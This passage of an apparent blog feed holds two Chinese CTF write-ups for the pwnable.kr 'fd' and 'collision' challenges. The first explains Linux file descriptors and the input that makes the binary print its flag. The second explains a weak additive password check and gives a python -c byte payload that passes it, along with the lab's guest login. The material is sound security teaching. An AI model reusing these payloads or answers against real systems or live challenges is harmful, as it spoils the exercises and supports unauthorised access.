class="string">"%d\n"</span>,atoi(s4));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果为：</span></span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1234567890</span></span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure><blockquote><p>所以说对于atoi函数的返回值来说：该函数返回转换后的长整数，如果没有执行有效的转换，则返回零。其实也可以理解为将纯数字的字符串转化为数值，含有其他符号的字符串将返回0。</p></blockquote><h4 id="font-color-blue2read函数font"><a class="markdownIt-Anchor" href="#font-color-blue2read函数font"></a> <font color="blue"><code>2.read()函数</code></font></h4><blockquote><p>① read函数被包含在unistd.h标准库中</p><p>② read函数的声明：<code>ssize_t read(int fd, void *buf, size_t count)</code>;</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里要解释一下fd文件描述符的作用：</span><br><span class="line"></span><br><span class="line">在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符。</span><br><span class="line"></span><br><span class="line">程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。</span><br></pre></td></tr></table></figure><p><img src="/images/108-2.png" alt></p><blockquote><p>③ read函数的解释：read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read()不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动</p><p>④ read函数的返回值：成功返回读取的字节数，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0</p></blockquote><h4 id="font-color-blue3c函数中main函数的参数font"><a class="markdownIt-Anchor" href="#font-color-blue3c函数中main函数的参数font"></a> <font color="blue"><code>3.C函数中main函数的参数</code></font></h4><blockquote><p>表示形式：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span> </span>= <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br></pre></td></tr></table></figure><blockquote><p><strong>其参数argc和argv用于运行时,把命令行参数传入主程序.其中ARG是指arguments,即参数.具体含义如下:</strong></p><ul><li><p><font color="red"><strong>int argc:英文名为arguments count(参数计数)</strong></font></p><p>*<strong>count of cmd line args,运行程序传送给main函数的命令行参数总个数,包括可执行程序名,其中当argc=1时表示只有一个程序名称,此时存储在argv[0]中.</strong></p></li><li><p><font color="red"><strong>char **argv:英文名为arguments value/vector(参数值)</strong></font></p><p><strong>pointer to table of cmd line args,字符串数组,用来存放指向字符串参数的指针数组,每个元素指向一个参数,空格分隔参数,其长度为argc.数组下标从0开始,argv[argc]=NULL.</strong></p><ul><li>argv[0] 指向程序运行时的全路径名</li><li>argv[1] 指向程序在DOS命令中执行程序名后的第一个字符串</li><li>argv[2] 指向执行程序名后的第二个字符串</li><li>argv[argc] 为NULL</li></ul></li><li><p>实例如下：</p></li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"argc is %d\n"</span>,argc);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;argc;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d:"</span>,i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,argv[i]);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"PAUSE"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>执行<code>./test 1 2 3 A B C</code>得到如下的结果：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">argc is 7</span><br><span class="line">0:./test</span><br><span class="line">1:1</span><br><span class="line">2:2</span><br><span class="line">3:3</span><br><span class="line">4:A</span><br><span class="line">5:B</span><br><span class="line">6:C</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-题目分析font"></a> <font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh fd@pwnable.kr -p2222</span><br></pre></td></tr></table></figure><p>链接上去之后，查看一下相关的文件以及权限：<code>ls -l</code>，得到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total 16</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span><br></pre></td></tr></table></figure><p>可以看出只有<strong>fd</strong>文件可执行，<strong>fd.c</strong>文件对root可读可写，那下面我们打开<strong>fd.c</strong>文件，分析一下源码，上源码！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就来分析一下上述的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(argc&lt;2)&#123;</span><br><span class="line">       printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">       return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面的 <strong>if</strong> 语句是用来判断执行fd文件的参数，如果小于2则终止程序。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fd = atoi( argv[1] ) - 0x1234;</span><br></pre></td></tr></table></figure><blockquote><p>利用atoi函数用来计算read函数中的fd，fd是第2个参数，也就是输入的第一个参数减去0x1234（十进制为4660）的值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len = read(fd, buf, 32);</span><br></pre></td></tr></table></figure><blockquote><p>把fd指向的文件中，读取32个字节到buf数组中，我们希望fd为0，因为当fd=0时，我们就可以从键盘输入字符串，那么就能把字符串输入到buf数组里。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">         printf(&quot;good job :)\n&quot;);</span><br><span class="line">         system(&quot;/bin/cat flag&quot;);</span><br><span class="line">         exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>判断我们输入的串是否与&quot;LETMEWIN&quot;一样，若LETMEWIN = buf，则执行if条件语句，也就是说我们输入的字符串为&quot;LETMEWIN&quot;</p></blockquote><h3 id="font-color-navy0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-解题步骤font"></a> <font color="navy"><code>0x02 解题步骤</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@木子冰:# ssh fd@pwnable.kr -p2222</span><br><span class="line">fd@pwnable.kr&apos;s password:guest</span><br><span class="line"> ____  __    __  ____    ____  ____   _        ___      __  _  ____</span><br><span class="line">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \</span><br><span class="line">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &apos; / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /</span><br><span class="line">|  |  |  `  &apos;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \</span><br><span class="line">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span><br><span class="line">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span><br><span class="line"></span><br><span class="line">fd@pwnable:~$ ls -l</span><br><span class="line">total 16</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span><br><span class="line"></span><br><span class="line">fd@pwnable:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x03-参考文章font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-参考文章font"></a> <font color="navy"><code>0x03 参考文章</code></font></h3><blockquote><ol><li><a href="https://www.jianshu.com/p/096974c1e5c4" target="_blank" rel="noopener">pwnable第一关fd</a></li><li><a href="https://blog.csdn.net/Eastmount/article/details/20413773" target="_blank" rel="noopener">[C/C++基础知识] main函数的参数argc和argv</a></li><li><a href="https://blog.csdn.net/cywosp/article/details/38965239" target="_blank" rel="noopener">每天进步一点点——Linux中的文件描述符与打开文件之间的关系</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-相关知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-相关知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 相
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（二）[collision]</title>
    <link href="https://muzibing.github.io/2020/04/23/2020.04.24%EF%BC%88109%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/23/2020.04.24（109）/</id>
    <published>2020-04-22T16:00:00.000Z</published>
    <updated>2020-04-29T08:49:53.044Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-相关知识font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-相关知识font"></a> <font color="navy"><code>0x00 相关知识</code></font></h3><h4 id="font-color-blue1pwntools工具的使用font"><a class="markdownIt-Anchor" href="#font-color-blue1pwntools工具的使用font"></a> <font color="blue"><code>1.PwnTools工具的使用</code></font></h4><blockquote><p>这个知识点再单独进行总结</p></blockquote><h4 id="font-color-blue2字符串强制转换为数字font"><a class="markdownIt-Anchor" href="#font-color-blue2字符串强制转换为数字font"></a> <font color="blue"><code>2.字符串强制转换为数字</code></font></h4><blockquote><p>可以从下面题目中的例子发现</p></blockquote><h4 id="font-color-blue3python-c的功能font"><a class="markdownIt-Anchor" href="#font-color-blue3python-c的功能font"></a> <font color="blue"><code>3.python -c的功能</code></font></h4><blockquote><p>Specify the command to execute. This terminates the option list (following options are passed as arguments to the command).</p><p>指定要执行的命令。这将终止选项列表 (紧跟的选项作为参数传递给命令)</p></blockquote><h4 id="font-color-blue4shell命令中和的作用font"><a class="markdownIt-Anchor" href="#font-color-blue4shell命令中和的作用font"></a> <font color="blue"><code>4.shell命令中``和$的作用</code></font></h4><blockquote><p>反引号在Linux shell命令行中有特殊的含义：反引号间的内容，会被shell先执行。其输出被放入主命令后，主命令再被执行。比如：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@euca-10-254-99-183 ~]# cd /usr/src/kernels/`uname -r`</span><br><span class="line">[root@euca-10-254-99-183 4.12.11-300.fc26.x86_64]#</span><br></pre></td></tr></table></figure><blockquote><p>或者是</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@euca-10-254-99-183 ~]# cd /usr/src/kernels/$(uname -r)</span><br><span class="line">[root@euca-10-254-99-183 4.12.11-300.fc26.x86_64]#</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-题目分析font"></a> <font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh col@pwnable.kr -p2222</span><br></pre></td></tr></table></figure><p>连上服务器之后，查看一下有什么文件以及相关的权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total 16</span><br><span class="line">-r-sr-x--- 1 col_pwn col     7341 Jun 11  2014 col</span><br><span class="line">-rw-r--r-- 1 root    root     555 Jun 12  2014 col.c</span><br><span class="line">-r--r----- 1 col_pwn col_pwn   52 Jun 11  2014 flag</span><br></pre></td></tr></table></figure><p>和上个题目一样，我们接着看看<code>col.c</code>文件中的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font color="navy"><strong>下面就来分析一下源码</strong>：</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>和第一题一样，要求我们输入的参数不能小于1个（因为还有1个是程序名自身）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们输入的第一个参数的长度要为20字节，否则就会终止程序</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br></pre></td></tr></table></figure><blockquote><p>这是最关键的一段代码，要求<code>hashcode == check_password( argv[1] )</code>，也就是说我们输入的参数在经过函数check_password()之后的结果要于hashcode同值同类型，下面是hashcode和check_password()函数的源码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>从第2行和第3行来看，可以看出来将我们输入的参数（string）强制转化为了int类型，下面我们看一下这里的汇编代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">08048494 &lt;check_password&gt;:</span><br><span class="line"> 8048494:       55                      push   %ebp</span><br><span class="line"> 8048495:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8048497:       83 ec 10                sub    $0x10,%esp</span><br><span class="line"> 804849a:       8b 45 08                mov    0x8(%ebp),%eax</span><br><span class="line"> 804849d:       89 45 fc                mov    %eax,-0x4(%ebp)</span><br><span class="line"> 80484a0:       c7 45 f8 00 00 00 00    movl   $0x0,-0x8(%ebp)</span><br><span class="line"> 80484a7:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp)</span><br><span class="line"> 80484ae:       eb 12                   jmp    80484c2 &lt;check_password+0x2e&gt;</span><br><span class="line"> 80484b0:       8b 45 f4                mov    -0xc(%ebp),%eax</span><br><span class="line"> 80484b3:       c1 e0 02                shl    $0x2,%eax</span><br><span class="line"> 80484b6:       03 45 fc                add    -0x4(%ebp),%eax</span><br><span class="line"> 80484b9:       8b 00                   mov    (%eax),%eax</span><br><span class="line"> 80484bb:       01 45 f8                add    %eax,-0x8(%ebp)</span><br><span class="line"> 80484be:       83 45 f4 01             addl   $0x1,-0xc(%ebp)</span><br><span class="line"> 80484c2:       83 7d f4 04             cmpl   $0x4,-0xc(%ebp)</span><br><span class="line"> 80484c6:       7e e8                   jle    80484b0 &lt;check_password+0x1c&gt;</span><br><span class="line"> 80484c8:       8b 45 f8                mov    -0x8(%ebp),%eax</span><br><span class="line"> 80484cb:       c9                      leave</span><br><span class="line"> 80484cc:       c3                      ret</span><br></pre></td></tr></table></figure><blockquote><p>将上图的汇编代码用图示表示如下：</p></blockquote><p><img src="/images/109-1.gif" alt></p><p><code>附：我已经将PPT上传到百度云，有兴趣的可以下载</code><a href="https://pan.baidu.com/s/1neQS53_AsB4ThzozRD5Xqw" target="_blank" rel="noopener">下载链接（提取码: ra6q）</a></p><blockquote><p>可以从汇编代码中可以看出，check_password()函数将我们输入的长度为20的字符串，按照每4个唯一单位，分为5次相加，所得到的结果要等于<code>0x21DD09EC</code></p></blockquote><h3 id="font-color-navy0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-解题步骤font"></a> <font color="navy"><code>0x02 解题步骤</code></font></h3><blockquote><p>该题最重要的是如何将我们输入的字符串按照每四个的长度相加等于<code>0x21DD09EC</code>，十进制为<code>568134124</code></p></blockquote><p><code>思路：</code></p><ol><li>将<code>568134124</code>/5，得到<code>113626824.8</code>，明显不能整除</li><li>求的余数为：568134124 - 113626824*4 = <code>113626828</code></li><li>所以我们要输入的应该为<code>113626824113626824113626824113626824113626828</code>，其中：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">113626824</span>)</span><br><span class="line"><span class="string">'0x6c5cec8'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">113626828</span>)</span><br><span class="line"><span class="string">'0x6c5cecc'</span></span><br></pre></td></tr></table></figure><ol start="4"><li>因为是小段口输入，所以在构造exploit时，要对字符串进行逆转，<code>\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06</code></li><li>构造的exploit如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c &apos;print &quot;\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06&quot;&apos;`</span><br><span class="line"></span><br><span class="line">或者是</span><br><span class="line"></span><br><span class="line"> ./col $(python -c &apos;print &quot;\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06&quot;&apos;)</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x03-参考文章font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-参考文章font"></a> <font color="navy"><code>0x03 参考文章</code></font></h3><ol><li><a href="https://0xrick.github.io/pwn/collision/" target="_blank" rel="noopener">pwnable.kr - collision</a></li><li><a href="https://blog.csdn.net/phoenix339/article/details/90405610" target="_blank" rel="noopener">python -c 执行单行命令/脚本，有点意思</a></li><li><a href="https://blog.csdn.net/chengyq116/article/details/87894641" target="_blank" rel="noopener">Python -c / -m 执行命令</a></li><li><a href="https://www.jianshu.com/p/ed41f2e48464" target="_blank" rel="noopener">Shell命令中的反引号（`）</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-相关知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-相关知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 相
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
